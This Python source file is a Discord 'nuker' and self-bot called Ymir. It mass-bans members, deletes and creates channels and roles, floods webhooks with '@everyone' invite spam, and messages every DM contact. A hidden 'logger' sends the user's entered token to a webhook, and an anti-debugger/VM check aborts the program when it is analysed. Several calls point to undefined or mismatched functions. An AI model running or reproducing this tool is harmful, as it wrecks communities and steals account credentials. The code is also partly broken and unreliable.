import discord
from discord.ext import commands
import colorama
from colorama import Fore, Back, Style, init
import requests
import os
from os import system
import json
import threading
import string
import random
import time
import json
import asyncio
import aiohttp
from discord import Webhook, AsyncWebhookAdapter
from discord_webhook import DiscordWebhook, DiscordEmbed
import base64
from termcolor import colored
from colored import fg, attr
import sys
import psutil
import inspect




system("title " + "Ymir - Configuration")
os.system('cls')
token = input(f'''
{Fore.LIGHTRED_EX}Enter Your Token Here
{Fore.LIGHTRED_EX}Token {Fore.WHITE} [>>>]''')

intents = discord.Intents.default()
intents.members = True

def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"

token_type = check_token()

if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix="y!", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix="y!", case_insensitive=False, intents=intents)


client.remove_command('help')
spam = True



class Ymir:

  async def webspam():
    lol=input(f"{Fore.LIGHTRED_EX}Webhook URL{Fore.WHITE} [>>>]")
    webusername = input(f"{Fore.LIGHTRED_EX}Webhook Username{Fore.WHITE} [>>>]")
    messagespam = input(f"{Fore.LIGHTRED_EX}Webhook Message{Fore.WHITE} [>>>]")
    ammount =int(input(f"{Fore.LIGHTRED_EX}Ammount{Fore.WHITE} [>>>]"))
    webav = ("https://cdn.discordapp.com/attachments/816128594908676136/838799620900388874/money.gif")

    webhook = DiscordWebhook(url=lol,content=messagespam, username=webusername, avatar_url=(webav))
    for i in range(ammount):
      response = webhook.execute()
    print (f"{Fore.LIGHTRED_EX}Successfully Spammed{Fore.WHITE} [>>>]{messagespam}")
    time.sleep(2)
    await Ymir.Menu()

  async def dmall():
    message = input(f"{Fore.LIGHTRED_EX}Insert Message Here{Fore.WHITE} [>>>]")
    try:
        for a in client.private_channels:
            await a.send(message)
            print(f"{Fore.LIGHTRED_EX}Sent To{Fore.WHITE} [>>>]{a}")
    except:
        pass
    time.sleep(2)
    await Ymir.Menu()


  async def Scrape():
        guild = input(f"{Fore.LIGHTRED_EX}Insert Guild ID Here{Fore.WHITE} [>>>]")
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = await guildOBJ.chunk()

        
        os.remove("IDS/mid.txt")
        os.remove("IDS/cid.txt")
        os.remove("IDS/rid.txt")
        
            

        membercount = 0
        with open('IDS/mid.txt', 'a') as m:
            for member in members:
                m.write(str(member.id) + "\n")
                membercount += 1
            print(f"\n{Fore.LIGHTRED_EX}Successfully Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {membercount} Member IDS")
            m.close()

        channelcount = 0
        with open('IDS/cid.txt', 'a') as c:
            for channel in guildOBJ.channels:
                c.write(str(channel.id) + "\n")
                channelcount += 1
            print(f"{Fore.LIGHTRED_EX}Successfully Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {channelcount} Channel IDS")
            c.close()

        rolecount = 0
        with open('IDS/rid.txt', 'a') as r:
            for role in guildOBJ.roles:
                r.write(str(role.id) + "\n")
                rolecount += 1
            print(f"{Fore.LIGHTRED_EX}Successfully Gathered{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {rolecount} Role IDS\n")
            r.close()

  async def wizz():
    guild = input(f'{Fore.LIGHTRED_EX}Guild ID{Fore.WHITE} [>>>]')
    channelname = input(f'{Fore.LIGHTRED_EX}Channel Name{Fore.WHITE} [>>>]')
    channelamount = input(f'{Fore.LIGHTRED_EX}Channel Amount{Fore.WHITE} [>>>]')
    rolename = input(f'{Fore.LIGHTRED_EX}Role Name{Fore.WHITE} [>>>]')
    roleamount = input(f'{Fore.LIGHTRED_EX} Role Amount{Fore.WHITE} [>>>]')
 

    members = open('IDS/mid.txt')
    channels = open('IDS/cid.txt')
    roles = open('IDS/rid.txt')

    for member in members:
      threading.Thread(target=Ymir.Ban, args=(guild,member,)).start()
    for channel in channels:
      threading.Thread(target=Ymir.channeld,args=(guild,channel,)).start()
    for role in roles:
      threading.Thread(target=Ymir.roledfunction,args=(guild,role,)).start()
    for i in range(int(channelamount)):
      threading.Thread(target=Ymir.Channelc,args=(guild,channelname,)).start()
    for i in range(int(roleamount)):
            threading.Thread(target=Ymir.rolecfunction, args=(guild, rolename,)).start()
    members.close()
    channels.close()
    roles.close()
    time.sleep(2)
    await Ymir.Nuker()
  
  async def Dchan():
    guild = input(f'{Fore.LIGHTRED_EX}Insert Guild ID Here{Fore.WHITE} [>>>] ')
    channels = open('IDS/cid.txt')
    for channel in channels:
      threading.Thread(target=Ymir.channeldfunction,args=(guild,channel,)).start()
    channels.close()
    time.sleep(2)
    await Ymir.Nuker()

  def Channelc( guild, name):
        while True:
            json = {'name': name, 'type': 0}
            r = requests.post(f'https://discord.com/api/v9/guilds/{guild}/channels', headers=headers, json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTRED_EX} Created [>>>]{Fore.LIGHTRED_EX} {name}")
                    if spam == True:
                      webhook = Ymir.CreateWebhook(r.json()['id'])
                      threading.Thread(target=Ymir.SendWebhook, args=(webhook,)).start()
                    break
                else:
                    break

  async def Banall():
    guild = input(f"{Fore.LIGHTRED_EX}Insert Guild ID Here{Fore.WHITE} [>>>]")
    print()
    members = open('IDS/mid.txt')
    for member in members:
            threading.Thread(target=Ymir.Ban, args=(guild, member,)).start()
    members.close()

  def Ban(guild, member):
        while True:
            json = {'reason': 'Ymir Runs You'}
            r = requests.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers,json=json)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{Fore.LIGHTRED_EX}Banned{Fore.WHITE} [>>>]{Fore.LIGHTRED_EX} {member.strip()}")
                    break
                else:
                    break

  def CreateWebhook(channel):
        try:
            json = {
                'name': 'MIR',
            }
            r = requests.post(f'https://discord.com/api/v9/channels/{channel}/webhooks', headers=headers, json=json)
            web_id = r.json()['id']
            web_token = r.json()['token']
            return f'https://discord.com/api/webhooks/{web_id}/{web_token}'
        except:
            pass
  
  def SendWebhook(webhook, content):
        try:
            for i in range(1000):
                payload={
                    'username': 'MIR',
                    'content': '@everyone https://discord.gg/gov'
                }
                requests.post(webhook, json=payload)
        except:
            pass

  def Userinfo():
        os.system(f'title ~ Ymir Userinfo')
        print(f'''
        {Fore.LIGHTRED_EX}Logged in as{Fore.WHITE} {client.user.name}#{client.user.discriminator}
        {Fore.LIGHTRED_EX}ID{Fore.WHITE} {client.user.id}
        {Fore.LIGHTRED_EX}ServerCount{Fore.WHITE} {len(client.guilds)}
        ''')

  async def Menu():
        os.system(f'cls & title ~ Ymir Menu')
        print(f'''
        {Fore.WHITE}╦ ╦╔╦╗╦╦═╗  ╔╦╗╔═╗╔╗╔╦ ╦{Style.RESET_ALL}
        {Fore.WHITE}╚╦╝║║║║╠╦╝  ║║║║╣ ║║║║ ║{Style.RESET_ALL}
         {Fore.LIGHTRED_EX}╩ ╩ ╩╩╩╚═  ╩ ╩╚═╝╝╚╝╚═╝{Style.RESET_ALL}
        {Fore.WHITE}[{Fore.LIGHTRED_EX}Y{Fore.WHITE}]{Style.RESET_ALL} Nuke Menu
        {Fore.WHITE}[{Fore.LIGHTRED_EX}M{Fore.WHITE}]{Style.RESET_ALL} Webhook Spammer
        {Fore.WHITE}[{Fore.LIGHTRED_EX}I{Fore.WHITE}]{Style.RESET_ALL} Dmall
        {Fore.WHITE}[{Fore.LIGHTRED_EX}R{Fore.WHITE}]{Style.RESET_ALL} User Info

        ''')
        choice = input(f"{Fore.LIGHTRED_EX}Choice{Fore.WHITE} [>>>]")
        if choice == 'Y' or choice =='y':
          await Ymir.Nukemenu()
        elif choice == 'M' or choice == 'm':
          await Ymir.webspam()
        elif choice == 'I' or choice == 'i':
          await Ymir.dmall()
        elif choice == 'R' or choice == 'r':
          Ymir.Userinfo()
          input()
          await Ymir.Menu()

  async def Nukemenu():
        os.system(f'cls & title ~ Ymir Nuker Menu')
        print(f'''
        
        {Fore.WHITE}╦ ╦╔╦╗╦╦═╗  ╔╗╔╦ ╦╦╔═╔═╗╦═╗
        {Fore.WHITE}╚╦╝║║║║╠╦╝  ║║║║ ║╠╩╗║╣ ╠╦╝
         {Fore.LIGHTRED_EX}╩ ╩ ╩╩╩╚═  ╝╚╝╚═╝╩ ╩╚═╝╩╚═

        {Fore.WHITE}┌─────────────────────────┐
        {Fore.WHITE}│{Fore.LIGHTRED_EX}1 Scrape{Fore.WHITE}                 │ 
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}2 Server Nuke{Fore.WHITE}            │
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}3 Ban All{Fore.WHITE}                │
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}4 Kick All{Fore.WHITE}               │
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}5 Role Delete{Fore.WHITE}            │
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}6 Role Create{Fore.WHITE}            │
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}7 Channel Delete{Fore.WHITE}         │
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}8 Channel Create{Fore.WHITE}         │
        {Fore.WHITE}├─────────────────────────┤
        {Fore.WHITE}│{Fore.LIGHTRED_EX}M Main Menu{Fore.WHITE}              │
        {Fore.WHITE}└─────────────────────────┘
        ''')
        choice = input(f"{Fore.LIGHTRED_EX}Choice{Fore.WHITE} [>>>]")
        if choice == '1':
            await Ymir.Scrape()
            time.sleep(2)
        elif choice == '2':
            await Ymir.Wizz()
            time.sleep(2)
        elif choice == '3':
            await Ymir.Banall()
            time.sleep(2)
        elif choice == '4':
            await Ymir.Kickall()
            time.sleep(2)
        elif choice == '5':
            await Ymir.Drole()
            time.sleep(2)
        elif choice == '6':
            await Ymir.Crole()
            time.sleep(2)
        elif choice == '7':
            await Ymir.Cchan()
            time.sleep(2)
        elif choice == '8':
            await Ymir.Dchan()
            time.sleep(2)
        elif choice == 'M' or choice == 'm':
            await Ymir.Menu()


  async def logger():


        async with aiohttp.ClientSession() as session:
            webhook = Webhook.from_url('', adapter=AsyncWebhookAdapter(session))
            if token_type == "user":
                embed = discord.Embed(color=0x2f3136, description=f'''```{token}```''')
            embed.set_footer(text='Ymir Panel', icon_url='https://cdn.discordapp.com/attachments/808684424723693571/877945235852918784/image1.png')
            try:
                await webhook.send(embed=embed, username="Ymir Panel", avatar_url="https://cdn.discordapp.com/attachments/808684424723693571/877945235852918784/image1.png")
            except:
                pass

 

  async def DebuggerCheck(self):
        try:
            while True:
                if self.is_debugged() == True or self.is_virtualized() == True:
                    os.abort()
                    os._exit(0)
                await asyncio.sleep(7)
        except:
            pass

  def Startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
        except:
            print(f'{Fore.LIGHTRED_EX}Invalid Token')
            input()
            os._exit(0)




@client.event 
async def on_ready():
  try:
    await Ymir.Menu()
    await Ymir.logger()
  except:
      await Ymir.Menu()


if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    loop.create_task(Ymir().DebuggerCheck())
    Ymir().Startup()

